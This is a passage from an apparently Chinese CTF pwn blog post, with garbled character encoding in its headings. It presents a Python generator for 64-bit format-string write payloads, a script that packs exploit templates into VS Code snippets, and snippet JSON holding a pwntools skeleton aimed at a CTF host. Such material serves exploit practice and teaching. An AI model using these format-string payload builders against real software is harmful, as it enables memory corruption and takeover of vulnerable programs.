class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">        low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">        location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="å°†ä¸Šè¿°æ¨¡æ¿å†™å…¥snippet"><a href="#å°†ä¸Šè¿°æ¨¡æ¿å†™å…¥snippet" class="headerlink" title="å°†ä¸Šè¿°æ¨¡æ¿å†™å…¥snippet"></a>å°†ä¸Šè¿°æ¨¡æ¿å†™å…¥snippet</h2><p>é‡‡å–äº†jsonåº“å’Œæ–‡ä»¶æ“ä½œæ¥å®ç°ï¼Œæ•´ä¸ªsettings.jsonæ¥é…ç½®è·¯å¾„å’Œprefixã€bodyç­‰ä¿¡æ¯<br>å‚ç…§codeçš„snippetè¯´æ˜å’Œæ ¼å¼è¦æ±‚æ¥å®Œæˆ<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>():</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    content = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;settings.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsdata = json.load(f)</span><br><span class="line"></span><br><span class="line">    jsonPath = jsdata[<span class="string">&quot;jsonPath&quot;</span>]</span><br><span class="line">    files = jsdata[<span class="string">&quot;filePath&quot;</span>]</span><br><span class="line">    names =  jsdata[<span class="string">&quot;snippetName&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(files[i], <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read().splitlines()</span><br><span class="line">        data[names[i]] = &#123;</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: names[i], </span><br><span class="line">            <span class="string">&quot;body&quot;</span>: content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jsonPath, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(data, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;OK!&quot;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Python-snippet"><a href="#Python-snippet" class="headerlink" title="Python.snippet"></a>Python.snippet</h3><p>è¿è¡Œpythonæ–‡ä»¶ï¼Œå¾—åˆ°çš„Pythonçš„snippetæ–‡ä»¶å¦‚ä¸‹<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;pwn&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;pwn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;from pwn import *&quot;</span>,</span><br><span class="line">            <span class="string">&quot;import sys&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;arch =  64&quot;</span>,</span><br><span class="line">            <span class="string">&quot;challenge = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc_path = &#x27;$2&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def dbg():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.log_level = &#x27;debug&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def echo(content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    print(\&quot;\\033[4;36;40mOutput prompts:\\033[0m\&quot; + \&quot;\\t\\033[7;33;40m[*]\\033[0m \&quot; + \&quot;\\033[1;31;40m\&quot; + content + \&quot;\\033[0m\&quot;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def exp():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    pass&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;local = int(sys.argv[1])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elf = ELF(challenge)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc = ELF(libc_path)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.os = &#x27;linux&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if local:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = process(challenge,env = &#123;\&quot;LD_PRELOAD\&quot;:libc_path&#125;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = remote(\&quot;node4.buuoj.cn\&quot;, 25965)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if arch == 64:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;amd64&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elif arch == 32:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;i386&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p   = lambda      : pause() &quot;</span>,</span><br><span class="line">            <span class="string">&quot;s   = lambda x    : success(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;re  = lambda m, t : io.recv(numb=m, timeout=t)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ru  = lambda x    : io.recvuntil(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rl  = lambda      : io.recvline()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sd  = lambda x    : io.send(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sl  = lambda x    : io.sendline(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia  = lambda      : io.interactive()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sla = lambda a, b : io.sendlineafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sa  = lambda a, b : io.sendafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu32 = lambda x   : u32(x.ljust(4,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu64 = lambda x   : u64(x.ljust(8,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bps = []&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pie = 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def gdba():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if local == 0:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        return 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    cmd =&#x27;set follow-fork-mode parent\\n&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if pie:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        base = int(os.popen(\&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;\&quot;.format(io.pid)).readlines()[1],16)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b+base) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;set $base=&#123;:#x&#125;\\n&#x27;.format(base)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd+=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    gdb.attach(io,cmd)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;exp()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia()&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;menu&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;menu&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;_add,_free,_edit,_show = 1,2,3,4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;menu = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def add(size, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_add))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(size))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def edit(idx, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_edit))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def free(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_free))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def show(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_show))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;64format&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;64format&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;def format_string_template_64(location_arg,target,after_change,len_other_string = 0,ljust_location = 0x50,bit = 0x6):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå³ç¬¬å‡ ä¸ªå‚æ•°&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ”¹å“ªé‡Œçš„å€¼&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æŠŠæƒ³æŠŠç›®æ ‡å€¼æ”¹æˆä»€ä¹ˆå€¼&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬å››ä¸ªå‚æ•°æ˜¯çœ‹çœ‹åœ¨printfä¹‹å‰è¿˜æœ‰æ²¡æœ‰å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦ä¸²&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬äº”ä¸ªå‚æ•°æ˜¯ljustå¡«è¡¥æ ¸å¿ƒpayloadä¹‹åï¼Œè®©å…¶0x8ä¸ªå­—èŠ‚å¯¹é½ï¼Œé»˜è®¤æ˜¯0x50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    ç¬¬å…­ä¸ªå‚æ•°æ˜¯è¦è¦†ç›–çš„ä½æ•°ï¼Œé»˜è®¤ä¸º6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 1:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 2:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 3:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    